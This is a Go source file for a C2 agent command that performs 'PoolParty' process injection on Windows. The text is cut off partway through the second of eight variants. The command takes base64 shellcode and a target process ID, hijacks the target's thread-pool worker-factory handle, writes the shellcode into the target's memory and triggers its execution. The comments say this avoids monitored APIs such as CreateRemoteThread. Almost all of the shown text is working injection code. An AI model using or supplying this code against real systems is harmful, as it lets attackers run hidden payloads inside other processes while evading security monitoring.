//go:build windows
// +build windows

// Package commands provides the poolparty-injection command for Thread Pool-based process injection.
//
// This command implements PoolParty injection techniques based on SafeBreach Labs research.
// All 8 variants are supported:
//   - Variant 1: Worker Factory Start Routine Overwrite
//   - Variant 2: TP_WORK Insertion (Task Queue)
//   - Variant 3: TP_WAIT Insertion (Event signaling)
//   - Variant 4: TP_IO Insertion (File I/O completion)
//   - Variant 5: TP_ALPC Insertion (ALPC port messaging)
//   - Variant 6: TP_JOB Insertion (Job object assignment)
//   - Variant 7: TP_DIRECT Insertion (I/O Completion Port)
//   - Variant 8: TP_TIMER Insertion (Timer Queue)
//
// These techniques abuse Windows Thread Pool internals to achieve code execution
// without calling CreateRemoteThread or similar monitored APIs.
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolParty-specific constants
const (
	// Process access rights
	PROCESS_DUP_HANDLE = 0x0040

	// Worker factory access rights
	WORKER_FACTORY_RELEASE_WORKER    = 0x0001
	WORKER_FACTORY_WAIT              = 0x0002
	WORKER_FACTORY_SET_INFORMATION   = 0x0004
	WORKER_FACTORY_QUERY_INFORMATION = 0x0008
	WORKER_FACTORY_READY_WORKER      = 0x0010
	WORKER_FACTORY_SHUTDOWN          = 0x0020
	WORKER_FACTORY_ALL_ACCESS        = windows.STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_RELEASE_WORKER | WORKER_FACTORY_WAIT | WORKER_FACTORY_SET_INFORMATION | WORKER_FACTORY_QUERY_INFORMATION | WORKER_FACTORY_READY_WORKER | WORKER_FACTORY_SHUTDOWN

	// I/O Completion access rights
	IO_COMPLETION_QUERY_STATE  = 0x0001
	IO_COMPLETION_MODIFY_STATE = 0x0002
	IO_COMPLETION_ALL_ACCESS   = windows.STANDARD_RIGHTS_REQUIRED | IO_COMPLETION_QUERY_STATE | IO_COMPLETION_MODIFY_STATE

	// Worker factory info classes
	WorkerFactoryBasicInformation = 7
	WorkerFactoryThreadMinimum    = 4

	// Process info class for handle enumeration
	ProcessHandleInformation = 51

	// Object info class
	ObjectTypeInformation = 2

	// Thread pool callback priorities
	TP_CALLBACK_PRIORITY_HIGH   = 0
	TP_CALLBACK_PRIORITY_NORMAL = 1
	TP_CALLBACK_PRIORITY_LOW    = 2

	// Memory protection (PAGE_READWRITE is in vanillainjection.go)
	PAGE_EXECUTE_READWRITE = 0x40
)

// WORKER_FACTORY_BASIC_INFORMATION structure
type WORKER_FACTORY_BASIC_INFORMATION struct {
	Timeout                  int64
	RetryTimeout             int64
	IdleTimeout              int64
	Paused                   uint8
	TimerSet                 uint8
	QueuedToExWorker         uint8
	MayCreate                uint8
	CreateInProgress         uint8
	InsertedIntoQueue        uint8
	Shutdown                 uint8
	_                        uint8 // padding
	BindingCount             uint32
	ThreadMinimum            uint32
	ThreadMaximum            uint32
	PendingWorkerCount       uint32
	WaitingWorkerCount       uint32
	TotalWorkerCount         uint32
	ReleaseCount             uint32
	InfiniteWaitGoal         int64
	StartRoutine             uintptr
	StartParameter           uintptr
	ProcessId                windows.Handle
	StackReserve             uintptr
	StackCommit              uintptr
	LastThreadCreationStatus int32
	_                        [4]byte // padding
}

// PROCESS_HANDLE_TABLE_ENTRY_INFO structure
type PROCESS_HANDLE_TABLE_ENTRY_INFO struct {
	HandleValue      windows.Handle
	HandleCount      uintptr
	PointerCount     uintptr
	GrantedAccess    uint32
	ObjectTypeIndex  uint32
	HandleAttributes uint32
	Reserved         uint32
}

// PROCESS_HANDLE_SNAPSHOT_INFORMATION structure (variable size)
type PROCESS_HANDLE_SNAPSHOT_INFORMATION struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	// Handles array follows
}

// PUBLIC_OBJECT_TYPE_INFORMATION structure
type PUBLIC_OBJECT_TYPE_INFORMATION struct {
	TypeName windows.NTUnicodeString
	Reserved [22]uint32
}

// LIST_ENTRY structure
type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

// TP_TASK_CALLBACKS structure
type TP_TASK_CALLBACKS struct {
	ExecuteCallback uintptr
	Unposted        uintptr
}

// TP_TASK structure
type TP_TASK struct {
	Callbacks      uintptr // Pointer to TP_TASK_CALLBACKS
	NumaNode       uint32
	IdealProcessor uint8
	_              [3]byte
	ListEntry      LIST_ENTRY
}

// TP_DIRECT structure - used for variant 7
type TP_DIRECT struct {
	Task                        TP_TASK
	Lock                        uint64
	IoCompletionInformationList LIST_ENTRY
	Callback                    uintptr
	NumaNode                    uint32
	IdealProcessor              uint8
	_                           [3]byte
}

// TPP_WORK_STATE union (represented as uint32)
type TPP_WORK_STATE struct {
	Exchange uint32
}

// Simplified TPP_CLEANUP_GROUP_MEMBER - matching SafeBreach structure exactly
type TPP_CLEANUP_GROUP_MEMBER struct {
	Refcount           int32      // TPP_REFCOUNT
	_                  [4]byte    // padding after Refcount
	VFuncs             uintptr    // VFuncs pointer
	CleanupGroup       uintptr    // CleanupGroup pointer
	CleanupGroupCancel uintptr    // CleanupGroupCancelCallback
	Finalization       uintptr    // FinalizationCallback
	CleanupGroupLinks  LIST_ENTRY // CleanupGroupMemberLinks
	CallbackBarrier    [24]byte   // TPP_BARRIER: TPP_FLAGS_COUNT(8) + RTL_SRWLOCK(8) + TPP_ITE(8)
	Callback           uintptr    // Union of various callbacks
	Context            uintptr
	ActivationContext  uintptr
	SubProcessTag      uintptr
	ActivityId         [16]byte // GUID
	WorkOnBehalfTicket [8]byte  // ALPC ticket
	RaceDll            uintptr
	Pool               uintptr // Pointer to FULL_TP_POOL
	PoolObjectLinks    LIST_ENTRY
	Flags              int32   // Union flags/longfunction/etc
	_                  [4]byte // padding
	AllocCaller        uintptr // TPP_CALLER is just a pointer
	ReleaseCaller      uintptr // TPP_CALLER is just a pointer
	CallbackPriority   int32
	_                  [4]byte // padding
}

// FULL_TP_WORK structure
type FULL_TP_WORK struct {
	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
	Task               TP_TASK
	WorkState          TPP_WORK_STATE
	_                  [4]byte // padding
}

// TPP_QUEUE structure (simplified)
type TPP_QUEUE struct {
	Queue LIST_ENTRY
	Lock  uintptr // RTL_SRWLOCK is pointer-sized (8 bytes on x64)
}

// FULL_TP_POOL structure (simplified - only fields we need)
type FULL_TP_POOL struct {
	_          [8]byte    // Refcount (4 bytes) + Padding_239 (4 bytes)
	_          [8]byte    // QueueState
	TaskQueue  [3]uintptr // Array of pointers to TPP_QUEUE
	_          [8]byte    // NumaNode pointer
	_          [8]byte    // ProximityInfo pointer
	_          [8]byte    // WorkerFactory pointer
	_          [8]byte    // CompletionPort pointer
	_          [8]byte    // Lock (RTL_SRWLOCK - 8 bytes on x64)
	_          [16]byte   // PoolObjectList
	_          [16]byte   // WorkerList
	TimerQueue TPP_TIMER_QUEUE
	// Rest omitted - we only need TimerQueue
}

// TPP_PH structure
type TPP_PH struct {
	Root uintptr
}

// TPP_PH_LINKS structure
type TPP_PH_LINKS struct {
	Siblings LIST_ENTRY
	Children LIST_ENTRY
	Key      int64
}

// TPP_TIMER_SUBQUEUE structure
type TPP_TIMER_SUBQUEUE struct {
	Expiration       int64
	WindowStart      TPP_PH
	WindowEnd        TPP_PH
	Timer            uintptr
	TimerPkt         uintptr
	Direct           TP_DIRECT
	ExpirationWindow uint32
	_                [4]byte // padding
}

// TPP_TIMER_QUEUE structure
type TPP_TIMER_QUEUE struct {
	Lock                uintptr // RTL_SRWLOCK is pointer-sized (8 bytes on x64)
	AbsoluteQueue       TPP_TIMER_SUBQUEUE
	RelativeQueue       TPP_TIMER_SUBQUEUE
	AllocatedTimerCount int32
	_                   [4]byte // padding
}

// FULL_TP_TIMER structure
type FULL_TP_TIMER struct {
	Work             FULL_TP_WORK
	Lock             uintptr      // RTL_SRWLOCK is pointer-sized (8 bytes on x64)
	WindowEndLinks   TPP_PH_LINKS // or ExpirationLinks (union)
	WindowStartLinks TPP_PH_LINKS
	DueTime          int64
	Ite              uintptr // TPP_ITE is just a pointer (8 bytes)
	Window           uint32
	Period           uint32
	Inserted         uint8
	WaitTimer        uint8
	TimerStatus      uint8
	BlockInsert      uint8
	_                [4]byte // padding
}

// T2_SET_PARAMETERS structure for NtSetTimer2
type T2_SET_PARAMETERS struct {
	_ [96]byte // Full structure is complex, we only need to pass zeros
}

// FULL_TP_WAIT structure - for variant 3
type FULL_TP_WAIT struct {
	Timer          FULL_TP_TIMER
	Handle         uintptr
	WaitPkt        uintptr
	NextWaitHandle uintptr
	NextWaitTimeout int64 // LARGE_INTEGER
	Direct         TP_DIRECT
	WaitFlags      uint8
	_              [7]byte // padding
}

// FULL_TP_IO structure - for variant 4
type FULL_TP_IO struct {
	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
	Direct             TP_DIRECT
	File               uintptr
	PendingIrpCount    int32
	_                  [4]byte // padding
}

// FULL_TP_ALPC structure - for variant 5
type FULL_TP_ALPC struct {
	Direct               TP_DIRECT
	CleanupGroupMember   TPP_CLEANUP_GROUP_MEMBER
	AlpcPort             uintptr
	DeferredSendCount    int32
	LastConcurrencyCount int32
	Flags                uint32
	_                    [4]byte // padding
}

// FULL_TP_JOB structure - for variant 6
type FULL_TP_JOB struct {
	Direct             TP_DIRECT
	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
	JobHandle          uintptr
	CompletionState    int64
	RundownLock        uintptr // RTL_SRWLOCK
}

// FILE_COMPLETION_INFORMATION structure - for variant 4
type FILE_COMPLETION_INFORMATION struct {
	Port uintptr
	Key  uintptr
}

// JOBOBJECT_ASSOCIATE_COMPLETION_PORT structure - for variant 6
type JOBOBJECT_ASSOCIATE_COMPLETION_PORT struct {
	CompletionKey  uintptr
	CompletionPort uintptr
}

// ALPC_PORT_ATTRIBUTES structure - for variant 5
type ALPC_PORT_ATTRIBUTES struct {
	Flags                uint32
	SecurityQos          [12]byte // SECURITY_QUALITY_OF_SERVICE
	MaxMessageLength     uint64
	MemoryBandwidth      uint64
	MaxPoolUsage         uint64
	MaxSectionSize       uint64
	MaxViewSize          uint64
	MaxTotalSectionSize  uint64
	DupObjectTypes       uint32
	Reserved             uint32
}

// ALPC_PORT_ASSOCIATE_COMPLETION_PORT structure - for variant 5
type ALPC_PORT_ASSOCIATE_COMPLETION_PORT struct {
	CompletionKey  uintptr
	CompletionPort uintptr
}

// PORT_MESSAGE structure - for variant 5
type PORT_MESSAGE struct {
	DataLength     uint16
	TotalLength    uint16
	Type           uint16
	DataInfoOffset uint16
	ClientId       [16]byte // CLIENT_ID (two uintptrs)
	MessageId      uint32
	CallbackId     uint32
}

// ALPC_MESSAGE structure - for variant 5
type ALPC_MESSAGE struct {
	PortHeader  PORT_MESSAGE
	PortMessage [1000]byte
}

// IO_STATUS_BLOCK structure - for variant 4
type IO_STATUS_BLOCK struct {
	Status      uintptr
	Information uintptr
}

// OBJECT_ATTRIBUTES structure - for variant 5
type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	_                        [4]byte // padding on 64-bit
	RootDirectory            uintptr
	ObjectName               uintptr // PUNICODE_STRING
	Attributes               uint32
	_                        [4]byte // padding
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// Note: UNICODE_STRING is defined in ts.go

// NT API procedures
var (
	ntdll                               = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationWorkerFactory = ntdll.NewProc("NtQueryInformationWorkerFactory")
	procNtSetInformationWorkerFactory   = ntdll.NewProc("NtSetInformationWorkerFactory")
	procNtQueryInformationProcess       = ntdll.NewProc("NtQueryInformationProcess")
	procNtQueryObject                   = ntdll.NewProc("NtQueryObject")
	procZwSetIoCompletion               = ntdll.NewProc("ZwSetIoCompletion")
	procRtlNtStatusToDosError           = ntdll.NewProc("RtlNtStatusToDosError")
	procNtSetTimer2                     = ntdll.NewProc("NtSetTimer2")
	procZwAssociateWaitCompletionPacket = ntdll.NewProc("ZwAssociateWaitCompletionPacket")
	procZwSetInformationFile            = ntdll.NewProc("ZwSetInformationFile")
	procNtAlpcCreatePort                = ntdll.NewProc("NtAlpcCreatePort")
	procNtAlpcSetInformation            = ntdll.NewProc("NtAlpcSetInformation")
	procNtAlpcConnectPort               = ntdll.NewProc("NtAlpcConnectPort")
	procTpAllocAlpcCompletion           = ntdll.NewProc("TpAllocAlpcCompletion")
	procTpAllocJobNotification          = ntdll.NewProc("TpAllocJobNotification")
	procReadProcessMemory               = kernel32.NewProc("ReadProcessMemory")
	procCreateThreadpoolWork            = kernel32.NewProc("CreateThreadpoolWork")
	procCloseThreadpoolWork             = kernel32.NewProc("CloseThreadpoolWork")
	procCreateThreadpoolTimer           = kernel32.NewProc("CreateThreadpoolTimer")
	procCloseThreadpoolTimer            = kernel32.NewProc("CloseThreadpoolTimer")
	procCreateThreadpoolWait            = kernel32.NewProc("CreateThreadpoolWait")
	procCloseThreadpoolWait             = kernel32.NewProc("CloseThreadpoolWait")
	procCreateThreadpoolIo              = kernel32.NewProc("CreateThreadpoolIo")
	procCloseThreadpoolIo               = kernel32.NewProc("CloseThreadpoolIo")
	procCreateEventW                    = kernel32.NewProc("CreateEventW")
	procSetEvent                        = kernel32.NewProc("SetEvent")
	procCreateFileW                     = kernel32.NewProc("CreateFileW")
	procWriteFile                       = kernel32.NewProc("WriteFile")
	procCreateJobObjectW                = kernel32.NewProc("CreateJobObjectW")
	procSetInformationJobObject         = kernel32.NewProc("SetInformationJobObject")
	procAssignProcessToJobObject        = kernel32.NewProc("AssignProcessToJobObject")
	procGetCurrentProcess               = kernel32.NewProc("GetCurrentProcess")
)

// Constants for new variants
const (
	// File creation flags
	FILE_FLAG_OVERLAPPED   = 0x40000000
	FILE_ATTRIBUTE_NORMAL  = 0x00000080
	CREATE_ALWAYS          = 2
	GENERIC_WRITE          = 0x40000000
	FILE_SHARE_READ        = 0x00000001
	FILE_SHARE_WRITE       = 0x00000002

	// File info class
	FileReplaceCompletionInformation = 61

	// ALPC info class
	AlpcAssociateCompletionPortInformation = 2

	// Job object info class
	JobObjectAssociateCompletionPortInformation = 7
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 2:
		output, err = executeVariant2(shellcode, uint32(params.PID))
	case 3:
		output, err = executeVariant3(shellcode, uint32(params.PID))
	case 4:
		output, err = executeVariant4(shellcode, uint32(params.PID))
	case 5:
		output, err = executeVariant5(shellcode, uint32(params.PID))
	case 6:
		output, err = executeVariant6(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	case 8:
		output, err = executeVariant8(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartRoutine,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant2 implements TP_WORK Insertion
func executeVariant2(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 4: Read target process's TP_POOL structure
	var targetTpPool FULL_TP_POOL
	var bytesRead uintptr
	ret, _, err := procReadProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartParameter,
		uintptr(unsafe.Pointer(&targetTpPool)),
		uintptr(unsafe.Sizeof(targetTpPool)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
	}
	output += "[+] Read target process's TP_POOL structure\n"

	// Step 5: Get high priority task queue address
	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
		return output, fmt.Errorf("high priority task queue is NULL")
	}

	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
	var targetQueue TPP_QUEUE
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH],
		uintptr(unsafe.Pointer(&targetQueue)),
		uintptr(unsafe.Sizeof(targetQueue)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
	}
	output += "[+] Read target process's task queue structure\n"

	// Step 6: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 7: Write shellcode
	var bytesWritten uintptr
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
	pTpWork, _, err := procCreateThreadpoolWork.Call(
		shellcodeAddr, // Work callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWork == 0 {
		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
	}
	output += "[+] Created TP_WORK structure associated with shellcode\n"

	// Step 9: Read and modify the TP_WORK structure
	var tpWork FULL_TP_WORK
	// Copy the structure from our local process
	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
	}

	// Close the local TP_WORK now that we've copied it
	procCloseThreadpoolWork.Call(pTpWork)

	// Modify: Point Pool to target's TP_POOL
	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Modify: Point Flink and Blink to the Queue field address in the target process
	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
	// We need the address of the Queue field within that TPP_QUEUE
	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	// Read current queue state before modifying
	var currentQueueFlink, currentQueueBlink uintptr
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr,
		uintptr(unsafe.Pointer(&currentQueueFlink)),
		uintptr(unsafe.Sizeof(currentQueueFlink)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
	}

	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr+8,
		uintptr(unsafe.Pointer(&currentQueueBlink)),
		uintptr(unsafe.Sizeof(currentQueueBlink)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
	}

	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)

	// If queue is empty (points to itself), simple circular list
	// If queue has items, insert at head
	if currentQueueFlink == targetQueueListAddr {
		output += "[*] Queue is empty, creating single-element list\n"
		tpWork.Task.ListEntry.Flink = targetQueueListAddr
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	} else {
		output += "[*] Queue has existing items, inserting at head\n"
		tpWork.Task.ListEntry.Flink = currentQueueFlink
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	}

	// Set WorkState exactly as SafeBreach does
	tpWork.WorkState.Exchange = 0x2
	output += "[+] Modified TP_WORK structure for insertion\n"

	// Step 10: Allocate memory for TP_WORK in target process
	tpWorkAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpWorkAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)

	// Step 11: Write TP_WORK to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpWorkAddr,
		uintptr(unsafe.Pointer(&tpWork)),
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)

	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))

	// Recalculate queue addresses (can't use := since variables already declared)
	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)

	// Update queue's Flink to point to our TP_WORK
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr,
		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
	}

	// Update queue's Blink based on whether queue was empty
	var blinkTarget uintptr
	if currentQueueFlink == targetQueueListAddr {
		// Queue was empty, so Blink also points to our work item
		blinkTarget = remoteWorkItemTaskListAddr
	} else {
		// Queue had items, need to update the old first item's Blink to point to us
		// and queue's Blink stays pointing to the last item
		// Actually, for simplicity, SafeBreach just sets both to the new item
		blinkTarget = remoteWorkItemTaskListAddr
	}

	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))),
		uintptr(unsafe.Pointer(&blinkTarget)),
		uintptr(unsafe.Sizeof(blinkTarget)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
	}

	// If there was an existing first item, update its Blink to point to our work item
	if currentQueueFlink != targetQueueListAddr {
		// Calculate the Blink address of the old first item
		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
		oldFirstItemBlinkAddr := currentQueueFlink + 8
		ret, _, err = procWriteProcessMemory.Call(
			uintptr(hProcess),
			oldFirstItemBlinkAddr,
			uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
